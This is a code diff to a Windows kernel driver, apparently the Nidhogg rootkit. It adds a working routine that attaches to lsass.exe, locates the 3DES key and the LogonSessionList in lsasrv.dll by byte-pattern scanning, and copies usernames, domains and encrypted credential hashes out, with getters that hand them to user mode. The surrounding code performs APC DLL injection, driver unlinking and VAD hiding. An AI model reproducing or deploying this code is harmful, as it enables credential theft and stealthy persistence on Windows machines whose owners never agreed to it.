@@ -1,11 +1,20 @@
 #include "pch.h"
+#include <bcrypt.h>
 #include "MemoryUtils.hpp"
+#include "ProcessUtils.hpp"
 #include "MemoryAllocator.hpp"
+#include "MemoryHelper.hpp"
 
 MemoryUtils::MemoryUtils() {
 	this->hiddenDrivers.Count = 0;
 	this->NtCreateThreadEx = NULL;
 	this->ssdt = NULL;
+
+	this->lastLsassInfo.Count = 0;
+	this->lastLsassInfo.LastCredsIndex = 0;
+	this->lastLsassInfo.Creds = NULL;
+	this->lastLsassInfo.DesKey.Data = NULL;
+	this->lastLsassInfo.Lock.Init();
 
 	if (NT_SUCCESS(GetSSDTAddress()))
 		this->NtCreateThreadEx = (tNtCreateThreadEx)GetSSDTFunctionAddress("NtCreateThreadEx");
@@ -23,6 +32,27 @@ MemoryUtils::~MemoryUtils() {
 
 	memset(&this->hiddenDrivers, 0, this->hiddenDrivers.Count);
 	this->hiddenDrivers.Count = 0;
+
+	AutoLock lsassLock(this->lastLsassInfo.Lock);
+
+	if (this->lastLsassInfo.DesKey.Data)
+		ExFreePoolWithTag(this->lastLsassInfo.DesKey.Data, DRIVER_TAG);
+
+	if (this->lastLsassInfo.Creds) {
+		if (this->lastLsassInfo.Count != 0) {
+			for (ULONG i = 0; i <= this->lastLsassInfo.LastCredsIndex; i++) {
+				if (this->lastLsassInfo.Creds[i].Username.Length > 0) {
+					FreeUnicodeString(&this->lastLsassInfo.Creds[i].Username);
+					FreeUnicodeString(&this->lastLsassInfo.Creds[i].Domain);
+					FreeUnicodeString(&this->lastLsassInfo.Creds[i].EncryptedHash);
+				}
+			}
+			this->lastLsassInfo.Count = 0;
+			this->lastLsassInfo.LastCredsIndex = 0;
+		}
+
+		ExFreePoolWithTag(this->lastLsassInfo.Creds, DRIVER_TAG);
+	}
 }
 
 /*
@@ -56,7 +86,7 @@ NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 	}
 
 	status = KeWriteProcessMemory(&(DllInfo->DllPath), PsGetCurrentProcess(), (PUCHAR)shellcode + PATH_OFFSET, sizeof(DllInfo->DllPath), KernelMode);
-	
+
 	if (!NT_SUCCESS(status)) {
 		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
 		return status;
@@ -368,7 +398,7 @@ NTSTATUS MemoryUtils::PatchModule(PatchedModule* ModuleInformation) {
 	SIZE_T moduleNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
 	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize, PagedPool);
 	status = moduleNameAllocator.CopyData(ModuleInformation->ModuleName, moduleNameSize);
-	
+
 	if (!NT_SUCCESS(status))
 		return status;
 
@@ -523,7 +553,7 @@ NTSTATUS MemoryUtils::HideDriver(HiddenDriverInformation* DriverInformation) {
 		loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
 		if (_wcsnicmp(loadedModulesEntry->FullDllName.Buffer, DriverInformation->DriverName,
-						loadedModulesEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+			loadedModulesEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
 
 			// Copying the original entry to make sure it can be restored again.
 			hiddenDriver.DriverName = DriverInformation->DriverName;
@@ -584,15 +614,327 @@ NTSTATUS MemoryUtils::UnhideDriver(HiddenDriverInformation* DriverInformation) {
 * DumpCredentials is responsible for dumping credentials from lsass.
 *
 * Parameters:
-* @LsassInformation [LsassInformation*] -- Output information to decrypt credentials.
+* AllocationSize [ULONG*]   -- Size to allocate for credentials buffer.
 *
 * Returns:
-* @status			[NTSTATUS]			-- Whether successfuly dumped or not.
+* @status		 [NTSTATUS] -- Whether successfuly dumped or not.
 */
-NTSTATUS DumpCredentials(LsassInformation* LsassInformation) {
-	NTSTATUS status = STATUS_SUCCESS;
+NTSTATUS MemoryUtils::DumpCredentials(ULONG* AllocationSize) {
+	KAPC_STATE state;
+	ULONG lsassPid = 0;
+	ULONG foundIndex = 0;
+	SIZE_T bytesWritten = 0;
+	PEPROCESS lsass = NULL;
+	ULONG credentialsIndex = 0;
+	ULONG validCredentialsCount = 0;
+	ULONG credentialsCount = 0;
+	PLSASRV_CREDENTIALS currentCredentials = NULL;
+	BCRYPT_ALG_HANDLE hProvider = NULL;
+
+	if (this->lastLsassInfo.LastCredsIndex != 0)
+		return STATUS_ABANDONED;
+
+	NTSTATUS status = NidhoggProccessUtils->FindPidByName(L"lsass.exe", &lsassPid);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	KeStackAttachProcess(lsass, &state);
+	do {
+		PVOID lsasrvBase = GetModuleBase(lsass, L"C:\\Windows\\System32\\lsasrv.dll");
+
+		if (!lsasrvBase) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		PVOID lsasrvMain = GetFunctionAddress(lsasrvBase, "LsaIAuditSamEvent");
+
+		if (!lsasrvMain) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		// Finding LsaEnumerateLogonSession and LsaInitializeProtectedMemory to extract the LogonSessionList and the 3DES key.
+		PVOID lsaEnumerateLogonSessionLocation = FindPattern((PUCHAR)&LogonSessionListLocation, 0xCC,
+			sizeof(LogonSessionListLocation), lsasrvMain,
+			LogonSessionListLocationDistance, NULL, 0);
+
+		if (!lsaEnumerateLogonSessionLocation) {
+			lsaEnumerateLogonSessionLocation = FindPattern((PUCHAR)&LogonSessionListLocation, 0xCC,
+				sizeof(LogonSessionListLocation), lsasrvMain,
+				LogonSessionListLocationDistance, NULL, 0, true);
+
+			if (!lsaEnumerateLogonSessionLocation) {
+				status = STATUS_NOT_FOUND;
+				break;
+			}
+		}
+
+		PVOID lsaInitializeProtectedMemory = FindPattern((PUCHAR)&IvDesKeyLocation, 0xCC,
+			sizeof(IvDesKeyLocation), lsasrvMain,
+			IvDesKeyLocationDistance, NULL, 0);
+
+		if (!lsaInitializeProtectedMemory) {
+			lsaInitializeProtectedMemory = FindPattern((PUCHAR)&IvDesKeyLocation, 0xCC,
+				sizeof(IvDesKeyLocation), lsasrvMain,
+				IvDesKeyLocationDistance, NULL, 0, true);
+
+			if (!lsaInitializeProtectedMemory) {
+				status = STATUS_NOT_FOUND;
+				break;
+			}
+		}
+
+		PVOID lsaEnumerateLogonSessionStart = FindPattern((PUCHAR)&FunctionStartSignature, 0xCC,
+			sizeof(FunctionStartSignature), lsaEnumerateLogonSessionLocation,
+			WLsaEnumerateLogonSessionLen, NULL, 0, true);
+
+		if (!lsaEnumerateLogonSessionStart) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		// Getting 3DES key
+		PULONG desKeyAddressOffset = (PULONG)FindPattern((PUCHAR)&DesKeySignature, 0xCC,
+			sizeof(DesKeySignature), lsaInitializeProtectedMemory, LsaInitializeProtectedMemoryLen,
+			&foundIndex, DesKeyOffset);
+
+		if (!desKeyAddressOffset) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		PBCRYPT_GEN_KEY desKey = (PBCRYPT_GEN_KEY)((PUCHAR)lsaInitializeProtectedMemory + (*desKeyAddressOffset)
+			+ foundIndex + DesKeyStructOffset);
+		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), sizeof(BCRYPT_GEN_KEY), STATUS_NOT_FOUND);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		if (desKey->hKey->tag != 'UUUR' || desKey->hKey->key->tag != 'MSSK') {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		this->lastLsassInfo.DesKey.Size = desKey->hKey->key->hardkey.cbSecret;
+		this->lastLsassInfo.DesKey.Data = ExAllocatePoolWithTag(PagedPool, this->lastLsassInfo.DesKey.Size, DRIVER_TAG);
+
+		if (!lastLsassInfo.DesKey.Data) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		status = MmCopyVirtualMemory(lsass, desKey->hKey->key->hardkey.data, IoGetCurrentProcess(),
+			this->lastLsassInfo.DesKey.Data, this->lastLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		// Getting LogonSessionList
+		PULONG logonSessionListAddressOffset = (PULONG)FindPattern((PUCHAR)&LogonSessionListSignature, 0xCC,
+			sizeof(LogonSessionListSignature), lsaEnumerateLogonSessionStart, WLsaEnumerateLogonSessionLen,
+			&foundIndex, LogonSessionListOffset);
+
+		if (!logonSessionListAddressOffset) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		PLIST_ENTRY logonSessionListAddress = (PLIST_ENTRY)((PUCHAR)lsaEnumerateLogonSessionStart + (*logonSessionListAddressOffset)
+			+ foundIndex);
+
+		logonSessionListAddress = (PLIST_ENTRY)AlignAddress((ULONGLONG)logonSessionListAddress);
+
+		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), sizeof(PLSASRV_CREDENTIALS), STATUS_NOT_FOUND);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		currentCredentials = (PLSASRV_CREDENTIALS)logonSessionListAddress->Flink;
+
+		// Getting the real amount of credentials.
+		while ((PLIST_ENTRY)currentCredentials != logonSessionListAddress) {			
+			credentialsCount++;
+			currentCredentials = currentCredentials->Flink;
+		}
+
+		if (credentialsCount == 0) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		this->lastLsassInfo.Creds = (Credentials*)ExAllocatePoolWithTag(PagedPool, credentialsCount * sizeof(Credentials), DRIVER_TAG);
+
+		if (!this->lastLsassInfo.Creds) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		memset(this->lastLsassInfo.Creds, 0, credentialsCount * sizeof(Credentials));
+		currentCredentials = (PLSASRV_CREDENTIALS)logonSessionListAddress->Flink;
+
+		// Getting the interesting information.
+		for (credentialsIndex = 0; credentialsIndex < credentialsCount && (PLIST_ENTRY)currentCredentials != logonSessionListAddress;
+			credentialsIndex++, currentCredentials = currentCredentials->Flink) {
+
+			if (currentCredentials->UserName.Length == 0 || !currentCredentials->Credentials)
+				continue;
+
+			if (!currentCredentials->Credentials->PrimaryCredentials)
+				continue;
+
+			if (currentCredentials->Credentials->PrimaryCredentials->Credentials.Length == 0)
+				continue;
+
+			this->lastLsassInfo.Creds[credentialsIndex].Username.Buffer = NULL;
+			status = CopyUnicodeString(lsass, &currentCredentials->UserName, IoGetCurrentProcess(),
+				&this->lastLsassInfo.Creds[credentialsIndex].Username, KernelMode);
+			
+			if (!NT_SUCCESS(status))
+				break;
+
+			this->lastLsassInfo.Creds[credentialsIndex].Domain.Buffer = NULL;
+			status = CopyUnicodeString(lsass, &currentCredentials->Domain, IoGetCurrentProcess(),
+				&this->lastLsassInfo.Creds[credentialsIndex].Domain, KernelMode);
+
+			if (!NT_SUCCESS(status)) {
+				ExFreePoolWithTag(this->lastLsassInfo.Creds[credentialsIndex].Username.Buffer, DRIVER_TAG);
+				break;
+			}
+
+			this->lastLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer = NULL;
+			status = CopyUnicodeString(lsass, &currentCredentials->Credentials->PrimaryCredentials->Credentials,
+				IoGetCurrentProcess(), &this->lastLsassInfo.Creds[credentialsIndex].EncryptedHash, KernelMode);
+			
+			if (!NT_SUCCESS(status)) {
+				ExFreePoolWithTag(this->lastLsassInfo.Creds[credentialsIndex].Domain.Buffer, DRIVER_TAG);
+				ExFreePoolWithTag(this->lastLsassInfo.Creds[credentialsIndex].Username.Buffer, DRIVER_TAG);
+				break;
+			}
+			validCredentialsCount++;
+		}
+
+	} while (false);
+	KeUnstackDetachProcess(&state);
+
+	if (!NT_SUCCESS(status)) {
+		if (credentialsIndex > 0) {
+			for (ULONG i = 0; i < credentialsIndex; i++) {
+				ExFreePoolWithTag(this->lastLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer, DRIVER_TAG);
+				ExFreePoolWithTag(this->lastLsassInfo.Creds[credentialsIndex].Domain.Buffer, DRIVER_TAG);
+				ExFreePoolWithTag(this->lastLsassInfo.Creds[credentialsIndex].Username.Buffer, DRIVER_TAG);
+			}
+		}
+
+		if (this->lastLsassInfo.Creds)
+			ExFreePoolWithTag(this->lastLsassInfo.Creds, DRIVER_TAG);
+
+		if (this->lastLsassInfo.DesKey.Data)
+			ExFreePoolWithTag(this->lastLsassInfo.DesKey.Data, DRIVER_TAG);
+	}
+	else {
+		this->lastLsassInfo.Count = validCredentialsCount;
+		this->lastLsassInfo.LastCredsIndex = validCredentialsCount - 1;
+		*AllocationSize = validCredentialsCount;
+	}
+
+	if (lsass)
+		ObDereferenceObject(lsass);
 
 	return status;
+}
+
+/*
+* Description:
+* GetCredentials is responsible for getting credentials from lsass.
+*
+* Parameters:
+* @Credential [OutputCredentials*] -- Credential entry to get from the lastLsassInfo.
+*
+* Returns:
+* @status	 [NTSTATUS]			 -- Whether successfuly sent or not.
+*/
+NTSTATUS MemoryUtils::GetCredentials(OutputCredentials* Credential) {
+	AutoLock lock(this->lastLsassInfo.Lock);
+
+	if (Credential->Index > this->lastLsassInfo.LastCredsIndex)
+		return STATUS_INVALID_PARAMETER;
+
+	if (Credential->Creds.Username.Length != this->lastLsassInfo.Creds[Credential->Index].Username.Length ||
+		Credential->Creds.Domain.Length != this->lastLsassInfo.Creds[Credential->Index].Domain.Length ||
+		Credential->Creds.EncryptedHash.Length != this->lastLsassInfo.Creds[Credential->Index].EncryptedHash.Length) {
+
+		Credential->Creds.Username.Length = this->lastLsassInfo.Creds[Credential->Index].Username.Length;
+		Credential->Creds.Domain.Length = this->lastLsassInfo.Creds[Credential->Index].Domain.Length;
+		Credential->Creds.EncryptedHash.Length = this->lastLsassInfo.Creds[Credential->Index].EncryptedHash.Length;
+		return STATUS_SUCCESS;
+	}
+
+	if (Credential->Creds.Username.Length == 0 || Credential->Creds.Domain.Length == 0 ||
+		Credential->Creds.EncryptedHash.Length == 0)
+		return STATUS_INVALID_ADDRESS;
+
+	NTSTATUS status = CopyUnicodeString(IoGetCurrentProcess(), &this->lastLsassInfo.Creds[Credential->Index].Username,
+		IoGetCurrentProcess(), &Credential->Creds.Username, KernelMode);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	status = CopyUnicodeString(IoGetCurrentProcess(), &this->lastLsassInfo.Creds[Credential->Index].Domain,
+		IoGetCurrentProcess(), &Credential->Creds.Domain, KernelMode);
+
+	if (!NT_SUCCESS(status)) {
+		memset(Credential->Creds.Username.Buffer, 0, Credential->Creds.Username.Length);
+		return status;
+	}
+
+	status = CopyUnicodeString(IoGetCurrentProcess(), &this->lastLsassInfo.Creds[Credential->Index].EncryptedHash,
+		IoGetCurrentProcess(), &Credential->Creds.EncryptedHash, KernelMode);
+
+	if (!NT_SUCCESS(status)) {
+		memset(Credential->Creds.Username.Buffer, 0, Credential->Creds.Username.Length);
+		memset(Credential->Creds.Domain.Buffer, 0, Credential->Creds.Domain.Length);
+		return status;
+	}
+
+	this->lastLsassInfo.Count--;
+	FreeUnicodeString(&this->lastLsassInfo.Creds[Credential->Index].Username);
+	FreeUnicodeString(&this->lastLsassInfo.Creds[Credential->Index].Domain);
+	FreeUnicodeString(&this->lastLsassInfo.Creds[Credential->Index].EncryptedHash);
+
+	if (Credential->Index == this->lastLsassInfo.LastCredsIndex)
+		SetCredLastIndex();
+
+	if (this->lastLsassInfo.Count == 0) {
+		ExFreePoolWithTag(this->lastLsassInfo.Creds, DRIVER_TAG);
+		this->lastLsassInfo.Creds = NULL;
+	}
+
+	return status;
+}
+
+/*
+* Description:
+* GetDesKey is responsible for getting the cached DES key.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @status	 [NTSTATUS]			 -- Whether successfuly dumped or not.
+*/
+NTSTATUS MemoryUtils::GetDesKey(DesKeyInformation* DesKey) {
+	SIZE_T bytesWritten = 0;
+	AutoLock lock(this->lastLsassInfo.Lock);
+
+	if (DesKey->Size != this->lastLsassInfo.DesKey.Size) {
+		DesKey->Size = this->lastLsassInfo.DesKey.Size;
+		return STATUS_SUCCESS;
+	}
+
+	return MmCopyVirtualMemory(IoGetCurrentProcess(), this->lastLsassInfo.DesKey.Data,
+		IoGetCurrentProcess(), DesKey->Data, this->lastLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
 }
 
 /*
@@ -708,7 +1050,7 @@ NTSTATUS MemoryUtils::VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress) 
 
 	// Finding the VAD node associated with the target address.
 	ULONG vadRootOffset = GetVadRootOffset();
-	ULONG pageCommitmentLockOffset = GetPageCommitmentLockOffset(); 
+	ULONG pageCommitmentLockOffset = GetPageCommitmentLockOffset();
 
 	if (vadRootOffset == 0 || pageCommitmentLockOffset == 0)
 		return STATUS_INVALID_ADDRESS;
@@ -751,12 +1093,12 @@ NTSTATUS MemoryUtils::VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress) 
 * VadFindNodeOrParent is responsible for finding a node inside the VAD tree.
 *
 * Parameters:
-* @Table			 [PRTL_AVL_TABLE]	   -- The table to search for the specific 
+* @Table			 [PRTL_AVL_TABLE]	   -- The table to search for the specific
 * @TargetPageAddress [ULONG_PTR]		   -- The start page address of the searched mapped object.
 * @OutNode			 [PRTL_BALANCED_NODE*] -- NULL if wasn't find, else the result described in the Returns section.
 *
 * Returns:
-* @result			 [TABLE_SEARCH_RESULT] -- 
+* @result			 [TABLE_SEARCH_RESULT] --
 * TableEmptyTree if the tree was empty
 * TableFoundNode if the key is found and the OutNode is the result node
 * TableInsertAsLeft / TableInsertAsRight if the node was not found and the OutNode contains what will be the out node (right or left respectively).
@@ -929,46 +1271,15 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 	KAPC_STATE state;
 	PEPROCESS CsrssProcess = NULL;
 	PVOID functionAddress = NULL;
-	PSYSTEM_PROCESS_INFO originalInfo = NULL;
-	PSYSTEM_PROCESS_INFO info = NULL;
-	ULONG infoSize = 0;
 	ULONG index = 0;
 	UCHAR syscall = 0;
-	HANDLE csrssPid = 0;
+	ULONG csrssPid = 0;
+	NTSTATUS status = NidhoggProccessUtils->FindPidByName(L"csrss.exe", &csrssPid);
 
-	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);
-
-	while (status == STATUS_INFO_LENGTH_MISMATCH) {
-		if (originalInfo)
-			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
-		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
-
-		if (!originalInfo)
-			break;
-		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
-	}
-
-	if (!NT_SUCCESS(status) || !originalInfo)
+	if (!NT_SUCCESS(status))
 		return functionAddress;
 
-	// Using another info variable to avoid BSOD on freeing.
-	info = originalInfo;
-
-	// Iterating the processes information until our pid is found.
-	while (info->NextEntryOffset) {
-		if (info->ImageName.Buffer && info->ImageName.Length > 0) {
-			if (_wcsicmp(info->ImageName.Buffer, L"csrss.exe") == 0) {
-				csrssPid = info->UniqueProcessId;
-				break;
-			}
-		}
-		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
-	}
-
-	if (csrssPid == 0)
-		return functionAddress;
-
-	status = PsLookupProcessByProcessId(csrssPid, &CsrssProcess);
+	status = PsLookupProcessByProcessId(ULongToHandle(csrssPid), &CsrssProcess);
 
 	if (!NT_SUCCESS(status))
 		return functionAddress;
@@ -1098,30 +1409,52 @@ NTSTATUS MemoryUtils::GetSSDTAddress() {
 * @size			  [ULONG_PTR]	-- Address range to search in.
 * @foundIndex	  [PULONG]	    -- Index of the found signature.
 * @relativeOffset [ULONG]		-- If wanted, relative offset to get from.
+* @reversed		  [bool]		-- If want to reverse search or regular search.
 *
 * Returns:
 * @address		  [PVOID]	    -- Pattern's address if found, else 0.
 */
-PVOID MemoryUtils::FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset) {
-	bool found;
+PVOID MemoryUtils::FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size,
+	PULONG foundIndex, ULONG relativeOffset, bool reversed) {
+	bool found = false;
 
 	if (pattern == NULL || base == NULL || len == 0 || size == 0)
 		return NULL;
 
-	for (ULONG i = 0; i < size; i++) {
-		found = true;
+	if (!reversed) {
+		for (ULONG i = 0; i < size; i++) {
+			found = true;
 
-		for (ULONG j = 0; j < len; j++) {
-			if (pattern[j] != wildcard && pattern[j] != ((PCUCHAR)base)[i + j]) {
-				found = false;
-				break;
+			for (ULONG j = 0; j < len; j++) {
+				if (pattern[j] != wildcard && pattern[j] != ((PCUCHAR)base)[i + j]) {
+					found = false;
+					break;
+				}
+			}
+
+			if (found) {
+				if (foundIndex)
+					*foundIndex = i;
+				return (PUCHAR)base + i + relativeOffset;
 			}
 		}
+	}
+	else {
+		for (int i = size; i >= 0; i--) {
+			found = true;
 
-		if (found) {
-			if (foundIndex)
-				*foundIndex = i;
-			return (PUCHAR)base + i + relativeOffset;
+			for (ULONG j = 0; j < len; j++) {
+				if (pattern[j] != wildcard && pattern[j] != *((PCUCHAR)base - i + j)) {
+					found = false;
+					break;
+				}
+			}
+
+			if (found) {
+				if (foundIndex)
+					*foundIndex = i;
+				return (PUCHAR)base - i - relativeOffset;
+			}
 		}
 	}
 
@@ -1269,7 +1602,7 @@ bool MemoryUtils::AddHiddenDriver(HiddenDriverItem item) {
 				ExFreePoolWithTag(buffer, DRIVER_TAG);
 				return false;
 			}
-			
+
 			if (i > this->hiddenDrivers.LastIndex)
 				this->hiddenDrivers.LastIndex = i;
 
@@ -1350,6 +1683,27 @@ bool MemoryUtils::RemoveHiddenDriver(ULONG index) {
 	}
 
 	return false;
+}
+
+/*
+* Description:
+* SetCredLastIndex is responsible for setting a new last index for the lastLsassInfo.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* There is no return value.
+*/
+void MemoryUtils::SetCredLastIndex() {
+	ULONG newLastIndex = 0;
+
+	for (ULONG i = 0; i < this->lastLsassInfo.LastCredsIndex; i++) {
+		if (this->lastLsassInfo.Creds[i].Username.Length > 0)
+			newLastIndex = i;
+	}
+
+	this->lastLsassInfo.LastCredsIndex = newLastIndex;
 }
 
 /*
